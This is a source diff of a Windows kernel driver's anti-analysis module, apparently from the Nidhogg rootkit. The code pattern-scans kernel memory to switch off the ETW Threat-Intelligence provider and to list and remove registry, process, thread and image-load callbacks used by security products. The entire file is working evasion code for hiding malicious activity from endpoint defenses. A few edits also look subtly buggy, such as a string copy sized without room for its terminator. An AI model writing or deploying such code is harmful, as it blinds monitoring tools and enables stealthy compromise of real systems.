@@ -1,20 +1,33 @@
 #include "pch.h"
 #include "AntiAnalysis.hpp"
+#include "MemoryAllocator.hpp"
 
 AntiAnalysis::AntiAnalysis() {
 	this->PrevEtwTiValue = 0;
 	this->DisabledCallbacksCount = 0;
+	this->DisabledCallbacksLastIndex = 0;
 
 	memset(this->DisabledCallbacks, 0, sizeof(this->DisabledCallbacks));
-	this->DisabledCallbacksCount = 0;
 
 	this->Lock.Init();
 }
 
 AntiAnalysis::~AntiAnalysis() {
+	KernelCallback callback{};
 	AutoLock locker(this->Lock);
+
+	for (ULONG i = 0; i < this->DisabledCallbacksLastIndex; i++) {
+		if (this->DisabledCallbacks[i].CallbackAddress != 0) {
+			callback.CallbackAddress = this->DisabledCallbacks[i].CallbackAddress;
+			callback.Type = this->DisabledCallbacks[i].Type;
+			callback.Remove = true;
+			RestoreCallback(&callback);
+		}
+	}
+
 	memset(this->DisabledCallbacks, 0, sizeof(this->DisabledCallbacks));
 	this->DisabledCallbacksCount = 0;
+	this->DisabledCallbacksLastIndex = 0;
 }
 
 /*
@@ -33,33 +46,23 @@ NTSTATUS AntiAnalysis::EnableDisableEtwTI(bool enable) {
 	ULONG foundIndex = 0;
 	SIZE_T bytesWritten = 0;
 	SIZE_T etwThreatIntProvRegHandleSigLen = sizeof(EtwThreatIntProvRegHandleSignature1);
-	UCHAR* etwThreatIntProvRegHandleSig = (UCHAR*)ExAllocatePoolWithTag(PagedPool, etwThreatIntProvRegHandleSigLen, DRIVER_TAG);
 
-	if (!etwThreatIntProvRegHandleSig)
-		return STATUS_INSUFFICIENT_RESOURCES;
-	RtlCopyMemory(etwThreatIntProvRegHandleSig, EtwThreatIntProvRegHandleSignature1, etwThreatIntProvRegHandleSigLen);
-
-	AutoLock lock(this->Lock);
 	PVOID searchedRoutineAddress = (PVOID)KeInsertQueueApc;
 	SIZE_T targetFunctionDistance = EtwThreatIntProvRegHandleDistance;
-	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)etwThreatIntProvRegHandleSig, 0xCC, etwThreatIntProvRegHandleSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
+	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)EtwThreatIntProvRegHandleSignature1, 0xCC, etwThreatIntProvRegHandleSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
 
 	if (!searchedRoutineOffset) {
-		RtlCopyMemory(etwThreatIntProvRegHandleSig, EtwThreatIntProvRegHandleSignature2, etwThreatIntProvRegHandleSigLen);
-		searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)etwThreatIntProvRegHandleSig, 0xCC, etwThreatIntProvRegHandleSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
+		searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)EtwThreatIntProvRegHandleSignature2, 0xCC, etwThreatIntProvRegHandleSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
 
-		if (!searchedRoutineOffset) {
-			status = STATUS_NOT_FOUND;
-			goto Cleanup;
-		}
+		if (!searchedRoutineOffset)
+			return STATUS_NOT_FOUND;
 	}
 	PUCHAR etwThreatIntProvRegHandle = (PUCHAR)searchedRoutineAddress + (*searchedRoutineOffset) + foundIndex + EtwThreatIntProvRegHandleOffset;
 	ULONG enableProviderInfoOffset = GetEtwProviderEnableInfoOffset();
 
-	if (enableProviderInfoOffset == (ULONG)STATUS_UNSUCCESSFUL) {
-		status = STATUS_UNSUCCESSFUL;
-		goto Cleanup;
-	}
+	if (enableProviderInfoOffset == (ULONG)STATUS_UNSUCCESSFUL)
+		return STATUS_UNSUCCESSFUL;
+
 	PTRACE_ENABLE_INFO enableProviderInfo = (PTRACE_ENABLE_INFO)(etwThreatIntProvRegHandle + EtwGuidEntryOffset + enableProviderInfoOffset);
 	ULONG lockOffset = GetEtwGuidLockOffset();
 
@@ -69,8 +72,10 @@ NTSTATUS AntiAnalysis::EnableDisableEtwTI(bool enable) {
 	}
 
 	if (enable) {
-		MmCopyVirtualMemory(PsGetCurrentProcess(), &this->PrevEtwTiValue, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode, &bytesWritten);
-		this->PrevEtwTiValue = 0;
+		status = MmCopyVirtualMemory(PsGetCurrentProcess(), &this->PrevEtwTiValue, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode, &bytesWritten);
+
+		if (NT_SUCCESS(status))
+			this->PrevEtwTiValue = 0;
 	}
 	else {
 		ULONG disableEtw = 0;
@@ -83,9 +88,6 @@ NTSTATUS AntiAnalysis::EnableDisableEtwTI(bool enable) {
 	if (etwThreatIntLock)
 		ExReleasePushLockExclusiveEx(&etwThreatIntLock, 0);
 
-Cleanup:
-	if (etwThreatIntProvRegHandleSig)
-		ExFreePoolWithTag(etwThreatIntProvRegHandleSig, DRIVER_TAG);
 	return status;
 }
 
@@ -103,7 +105,6 @@ NTSTATUS AntiAnalysis::RestoreCallback(KernelCallback* Callback) {
 	DisabledKernelCallback callback{};
 	NTSTATUS status = STATUS_NOT_FOUND;
 
-	AutoLock locker(this->Lock);
 	status = RemoveDisabledCallback(Callback, &callback);
 
 	if (!NT_SUCCESS(status))
@@ -265,10 +266,8 @@ NTSTATUS AntiAnalysis::RemoveCallback(KernelCallback* Callback) {
 		callback.Type = Callback->Type;
 	}
 
-	if (NT_SUCCESS(status)) {
-		AutoLock locker(this->Lock);
+	if (NT_SUCCESS(status))
 		status = AddDisabledCallback(callback);
-	}
 
 	return status;
 }
@@ -287,110 +286,58 @@ NTSTATUS AntiAnalysis::RemoveCallback(KernelCallback* Callback) {
 */
 NTSTATUS AntiAnalysis::ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64 ReplacerFunction, ULONG64 ReplacedFunction) {
 	NTSTATUS status = STATUS_SUCCESS;
-	UCHAR* listHeadSignature = NULL;
-	UCHAR* listHeadCountSignature = NULL;
-	UCHAR* callbacksListLockSignature = NULL;
-	UCHAR* mainFunctionSignature = NULL;
 	PCM_CALLBACK currentCallback = NULL;
 	ULONG foundIndex = 0;
 	CHAR driverName[MAX_DRIVER_PATH] = { 0 };
 
 	// Find CmpRegisterCallbackInternal.
 	SIZE_T targetFunctionSigLen = sizeof(CallFunctionSignature);
-	UCHAR* targetFunctionSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, targetFunctionSigLen, DRIVER_TAG);
-
-	if (!targetFunctionSignature) {
-		status = STATUS_INSUFFICIENT_RESOURCES;
-		goto Cleanup;
-	}
-	RtlCopyMemory(targetFunctionSignature, CallFunctionSignature, targetFunctionSigLen);
-
 	PVOID searchedRoutineAddress = (PVOID)CmRegisterCallback;
 	SIZE_T targetFunctionDistance = CmpRegisterCallbackInternalSignatureDistance;
 
-	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)targetFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
+	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)CallFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
 
-	if (!searchedRoutineOffset) {
-		status = STATUS_NOT_FOUND;
-		goto Cleanup;
-	}
+	if (!searchedRoutineOffset)
+		return STATUS_NOT_FOUND;
 
 	// Find the function that holds the valuable information: CmpInsertCallbackInListByAltitude.
 	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CallFunctionOffset;
 	targetFunctionSigLen = sizeof(CmpInsertCallbackInListByAltitudeSignature);
-	mainFunctionSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, targetFunctionSigLen, DRIVER_TAG);
-
-	if (!mainFunctionSignature) {
-		status = STATUS_INSUFFICIENT_RESOURCES;
-		goto Cleanup;
-	}
-	RtlCopyMemory(mainFunctionSignature, CmpInsertCallbackInListByAltitudeSignature, targetFunctionSigLen);
 	targetFunctionDistance = CmpInsertCallbackInListByAltitudeSignatureDistance;
 
-	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)mainFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
+	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)CmpInsertCallbackInListByAltitudeSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
 
-	if (!searchedRoutineOffset) {
-		status = STATUS_NOT_FOUND;
-		goto Cleanup;
-	}
-	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CmpInsertCallbackInListByAltitudeOffset;
+	if (!searchedRoutineOffset)
+		return STATUS_NOT_FOUND;
+
+	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset) + foundIndex + CmpInsertCallbackInListByAltitudeOffset;
 
 	// Get CallbackListHead and CmpCallBackCount.
 	SIZE_T listHeadSignatureLen = sizeof(CallbackListHeadSignature);
 	targetFunctionDistance = CallbackListHeadSignatureDistance;
-	listHeadSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listHeadSignatureLen, DRIVER_TAG);
-
-	if (!listHeadSignature) {
-		status = STATUS_INSUFFICIENT_RESOURCES;
-		goto Cleanup;
-	}
-	RtlCopyMemory(listHeadSignature, CallbackListHeadSignature, listHeadSignatureLen);
-
 	SIZE_T listHeadCountSignatureLen = sizeof(RoutinesListCountSignature);
-	listHeadCountSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listHeadCountSignatureLen, DRIVER_TAG);
+	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)CallbackListHeadSignature, 0xCC, listHeadSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)listHeadSignatureLen);
 
-	if (!listHeadCountSignature) {
-		status = STATUS_INSUFFICIENT_RESOURCES;
-		goto Cleanup;
-	}
-	RtlCopyMemory(listHeadCountSignature, RoutinesListCountSignature, listHeadCountSignatureLen);
+	if (!searchedRoutineOffset)
+		return STATUS_NOT_FOUND;
 
-	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)listHeadSignature, 0xCC, listHeadSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)listHeadSignatureLen);
-
-	if (!searchedRoutineOffset) {
-		status = STATUS_NOT_FOUND;
-		goto Cleanup;
-	}
 	PUCHAR callbacksList = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + RoutinesListOffset;
+	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)RoutinesListCountSignature, 0xCC, listHeadCountSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(listHeadCountSignatureLen - 1));
 
-	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)listHeadCountSignature, 0xCC, listHeadCountSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(listHeadCountSignatureLen - 1));
+	if (!searchedRoutineOffset)
+		return STATUS_NOT_FOUND;
 
-	if (!searchedRoutineOffset) {
-		status = STATUS_NOT_FOUND;
-		goto Cleanup;
-	}
 	ULONG callbacksListCount = *(PLONG)((PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CallbacksListCountOffset);
 
 	// Get CmpCallbackListLock.
 	SIZE_T callbacksListLockSignatureLen = sizeof(CmpCallbackListLockSignature);
-	callbacksListLockSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, callbacksListLockSignatureLen, DRIVER_TAG);
+	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)CmpCallbackListLockSignature, 0xCC, callbacksListLockSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(callbacksListLockSignatureLen - 1));
 
-	if (!callbacksListLockSignature) {
-		status = STATUS_INSUFFICIENT_RESOURCES;
-		goto Cleanup;
-	}
-	RtlCopyMemory(callbacksListLockSignature, CmpCallbackListLockSignature, callbacksListLockSignatureLen);
+	if (!searchedRoutineOffset)
+		return STATUS_NOT_FOUND;
 
-	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)callbacksListLockSignature, 0xCC, callbacksListLockSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(callbacksListLockSignatureLen - 1));
-
-	if (!searchedRoutineOffset) {
-		status = STATUS_NOT_FOUND;
-		goto Cleanup;
-	}
 	ULONG_PTR callbackListLock = (ULONG_PTR)((PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CmpCallbackListLockOffset);
-
 	ExAcquirePushLockExclusiveEx(&callbackListLock, 0);
-
 	currentCallback = (PCM_CALLBACK)callbacksList;
 
 	for (ULONG i = 0; i < callbacksListCount; i++) {
@@ -402,8 +349,9 @@ NTSTATUS AntiAnalysis::ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64
 			Callbacks->Callbacks[i].CallbackAddress = (ULONG64)currentCallback->Function;
 			Callbacks->Callbacks[i].Context = currentCallback->Context;
 
-			if (NT_SUCCESS(MatchCallback((PVOID)Callbacks->Callbacks[i].CallbackAddress, driverName)))
+			if (NT_SUCCESS(MatchCallback((PVOID)Callbacks->Callbacks[i].CallbackAddress, driverName))) {
 				strcpy_s(Callbacks->Callbacks[i].DriverName, driverName);
+			}
 		}
 		currentCallback = (PCM_CALLBACK)currentCallback->List.Flink;
 	}
@@ -412,15 +360,6 @@ NTSTATUS AntiAnalysis::ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64
 	if (!ReplacedFunction && !ReplacerFunction)
 		Callbacks->NumberOfCallbacks = callbacksListCount;
 
-Cleanup:
-	if (callbacksListLockSignature)
-		ExFreePoolWithTag(callbacksListLockSignature, DRIVER_TAG);
-	if (listHeadCountSignature)
-		ExFreePoolWithTag(listHeadCountSignature, DRIVER_TAG);
-	if (listHeadSignature)
-		ExFreePoolWithTag(listHeadSignature, DRIVER_TAG);
-	if (targetFunctionSignature)
-		ExFreePoolWithTag(targetFunctionSignature, DRIVER_TAG);
 	return status;
 }
 
@@ -460,14 +399,7 @@ NTSTATUS AntiAnalysis::ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 R
 		targetFunctionDistance = PspSetCreateProcessNotifyRoutineSignatureDistance;
 
 		listSigLen = sizeof(PspCreateProcessNotifyRoutineSignature);
-		listSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listSigLen, DRIVER_TAG);
-
-		if (!listSignature) {
-			status = STATUS_INSUFFICIENT_RESOURCES;
-			break;
-		}
-
-		RtlCopyMemory(listSignature, PspCreateProcessNotifyRoutineSignature, listSigLen);
+		listSignature = (UCHAR*)PspCreateProcessNotifyRoutineSignature;
 		listDistance = PspCreateProcessNotifyRoutineDistance;
 		break;
 	}
@@ -478,14 +410,7 @@ NTSTATUS AntiAnalysis::ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 R
 		targetFunctionDistance = PspSetCreateThreadNotifyRoutineSignatureDistance;
 
 		listSigLen = sizeof(PspCreateThreadNotifyRoutineSignature);
-		listSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listSigLen, DRIVER_TAG);
-
-		if (!listSignature) {
-			status = STATUS_INSUFFICIENT_RESOURCES;
-			break;
-		}
-
-		RtlCopyMemory(listSignature, PspCreateThreadNotifyRoutineSignature, listSigLen);
+		listSignature = (UCHAR*)PspCreateThreadNotifyRoutineSignature;
 		listDistance = PspCreateThreadNotifyRoutineDistance;
 		break;
 	}
@@ -495,14 +420,7 @@ NTSTATUS AntiAnalysis::ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 R
 		targetFunctionDistance = PsSetLoadImageNotifyRoutineExDistance;
 
 		listSigLen = sizeof(PspLoadImageNotifyRoutineSignature);
-		listSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listSigLen, DRIVER_TAG);
-
-		if (!listSignature) {
-			status = STATUS_INSUFFICIENT_RESOURCES;
-			break;
-		}
-
-		RtlCopyMemory(listSignature, PspLoadImageNotifyRoutineSignature, listSigLen);
+		listSignature = (UCHAR*)PspLoadImageNotifyRoutineSignature;
 		listDistance = PspLoadImageNotifyRoutineDistance;
 		break;
 	}
@@ -512,58 +430,37 @@ NTSTATUS AntiAnalysis::ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 R
 	}
 
 	if (!NT_SUCCESS(status))
-		goto Cleanup;
+		return status;
 
 	targetFunctionSigLen = sizeof(CallFunctionSignature);
-	targetFunctionSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, targetFunctionSigLen, DRIVER_TAG);
-
-	if (!targetFunctionSignature) {
-		status = STATUS_INSUFFICIENT_RESOURCES;
-		goto Cleanup;
-	}
-	RtlCopyMemory(targetFunctionSignature, CallFunctionSignature, targetFunctionSigLen);
-
 	listCountSigLen = sizeof(RoutinesListCountSignature);
-	listCountSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listCountSigLen, DRIVER_TAG);
-
-	if (!listCountSignature) {
-		status = STATUS_INSUFFICIENT_RESOURCES;
-		goto Cleanup;
-	}
-	RtlCopyMemory(listCountSignature, RoutinesListCountSignature, listCountSigLen);
 	countOffset = RoutinesListOffset;
 
-	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)targetFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
+	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)CallFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
 
-	if (!searchedRoutineOffset) {
-		status = STATUS_NOT_FOUND;
-		goto Cleanup;
-	}
+	if (!searchedRoutineOffset)
+		return STATUS_NOT_FOUND;
 
 	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CallFunctionOffset;
 
 	PLONG routinesListOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)listSignature, 0xCC, listSigLen - 1, searchedRoutineAddress, listDistance, &foundIndex, (ULONG)listSigLen);
 
-	if (!routinesListOffset) {
-		status = STATUS_NOT_FOUND;
-		goto Cleanup;
-	}
+	if (!routinesListOffset)
+		return STATUS_NOT_FOUND;
 
 	PUCHAR routinesList = (PUCHAR)searchedRoutineAddress + *(routinesListOffset)+foundIndex + RoutinesListOffset;
 
-	PLONG routinesLengthOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)listCountSignature, 0xCC, listCountSigLen - 1, searchedRoutineAddress, listDistance, &foundIndex, (ULONG)(listCountSigLen - 1));
+	PLONG routinesLengthOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)RoutinesListCountSignature, 0xCC, listCountSigLen - 1, searchedRoutineAddress, listDistance, &foundIndex, (ULONG)(listCountSigLen - 1));
 
-	if (!routinesLengthOffset) {
-		status = STATUS_NOT_FOUND;
-		goto Cleanup;
-	}
+	if (!routinesLengthOffset)
+		return STATUS_NOT_FOUND;
 
 	if (Callbacks->Type == PsCreateProcessType)
 		countOffset = PsNotifyRoutinesRoutineCountOffset;
 	else if (Callbacks->Type == PsCreateThreadTypeNonSystemThread)
 		countOffset = PsNotifyRoutinesRoutineCountOffset;
 
-	ULONG routinesCount = *(PLONG)((PUCHAR)searchedRoutineAddress + *(routinesLengthOffset)+foundIndex + countOffset);
+	ULONG routinesCount = *(PLONG)((PUCHAR)searchedRoutineAddress + *(routinesLengthOffset) + foundIndex + countOffset);
 
 	for (SIZE_T i = 0; i < routinesCount; i++) {
 		currentRoutine = *(PULONG64)(routinesList + (i * 8));
@@ -584,13 +481,6 @@ NTSTATUS AntiAnalysis::ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 R
 	if (!ReplacedFunction && !ReplacerFunction)
 		Callbacks->NumberOfRoutines = routinesCount;
 
-Cleanup:
-	if (listCountSignature)
-		ExFreePoolWithTag(listCountSignature, DRIVER_TAG);
-	if (listSignature)
-		ExFreePoolWithTag(listSignature, DRIVER_TAG);
-	if (targetFunctionSignature)
-		ExFreePoolWithTag(targetFunctionSignature, DRIVER_TAG);
 	return status;
 }
 
@@ -679,39 +569,39 @@ NTSTATUS AntiAnalysis::MatchCallback(PVOID callack, CHAR driverName[MAX_DRIVER_P
 	ULONG infoSize;
 
 	status = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &infoSize);
+	MemoryAllocator<PRTL_PROCESS_MODULES> infoAllocator(info, infoSize, PagedPool);
+
+	if (!info)
+		return STATUS_INSUFFICIENT_RESOURCES;
+	status = ZwQuerySystemInformation(SystemModuleInformation, info, infoSize, &infoSize);
 
 	while (status == STATUS_INFO_LENGTH_MISMATCH) {
-		if (info) {
-			ExFreePoolWithTag(info, DRIVER_TAG);
-			info = NULL;
-		}
+		status = infoAllocator.Realloc(infoSize);
 
-		info = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);
-
-		if (!info)
-			return STATUS_INSUFFICIENT_RESOURCES;
-
+		if (!NT_SUCCESS(status))
+			return status;
 		status = ZwQuerySystemInformation(SystemModuleInformation, info, infoSize, &infoSize);
 	}
 
 	if (!NT_SUCCESS(status) || !info)
-		goto CleanUp;
+		return status;
 
 	PRTL_PROCESS_MODULE_INFORMATION modules = info->Modules;
 
 	for (ULONG i = 0; i < info->NumberOfModules; i++) {
 		if (callack >= modules[i].ImageBase && callack < (PVOID)((PUCHAR)modules[i].ImageBase + modules[i].ImageSize)) {
-			if (modules[i].FullPathName)
-				strcpy_s(driverName, MAX_DRIVER_PATH, (const char*)modules[i].FullPathName);
+			if (modules[i].FullPathName) {
+				SIZE_T fullPathNameSize = strlen((const char*)modules[i].FullPathName);
+
+				if (fullPathNameSize <= MAX_DRIVER_PATH)
+					strcpy_s(driverName, fullPathNameSize, (const char*)modules[i].FullPathName);
+			}
 			else
 				status = STATUS_UNSUCCESSFUL;
 			break;
 		}
 	}
 
-CleanUp:
-	if (info)
-		ExFreePoolWithTag(info, DRIVER_TAG);
 	return status;
 }
 
@@ -727,12 +617,17 @@ CleanUp:
 */
 NTSTATUS AntiAnalysis::AddDisabledCallback(DisabledKernelCallback Callback) {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	AutoLock locker(this->Lock);
 
 	for (int i = 0; i < MAX_KERNEL_CALLBACKS; i++) {
 		if (!this->DisabledCallbacks[i].CallbackAddress) {
 			this->DisabledCallbacks[i].CallbackAddress = Callback.CallbackAddress;
 			this->DisabledCallbacks[i].Entry = Callback.Entry;
 			this->DisabledCallbacks[i].Type = Callback.Type;
+
+			if (i > this->DisabledCallbacksLastIndex)
+				this->DisabledCallbacksLastIndex = i;
+
 			this->DisabledCallbacksCount++;
 			status = STATUS_SUCCESS;
 			break;
@@ -754,17 +649,24 @@ NTSTATUS AntiAnalysis::AddDisabledCallback(DisabledKernelCallback Callback) {
 * @status			  [NTSTATUS]		  -- STATUS_SUCCESS if succeeded else the error.
 */
 NTSTATUS AntiAnalysis::RemoveDisabledCallback(KernelCallback* Callback, DisabledKernelCallback* DisabledCallback) {
-	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	NTSTATUS status = STATUS_NOT_FOUND;
+	ULONG newLastIndex = 0;
+	AutoLock locker(this->Lock);
 
-	for (ULONG i = 0; i < this->DisabledCallbacksCount; i++) {
+	for (ULONG i = 0; i <= this->DisabledCallbacksLastIndex; i++) {
 		if (this->DisabledCallbacks[i].CallbackAddress == Callback->CallbackAddress) {
 			DisabledCallback->CallbackAddress = this->DisabledCallbacks[i].CallbackAddress;
 			DisabledCallback->Entry = this->DisabledCallbacks[i].Entry;
 			DisabledCallback->Type = this->DisabledCallbacks[i].Type;
+
+			if (i == this->DisabledCallbacksLastIndex)
+				this->DisabledCallbacksLastIndex = newLastIndex;
 			this->DisabledCallbacksCount--;
 			status = STATUS_SUCCESS;
 			break;
 		}
+		else if (this->DisabledCallbacks[i].CallbackAddress != 0)
+			newLastIndex = i;
 	}
 
 	return status;
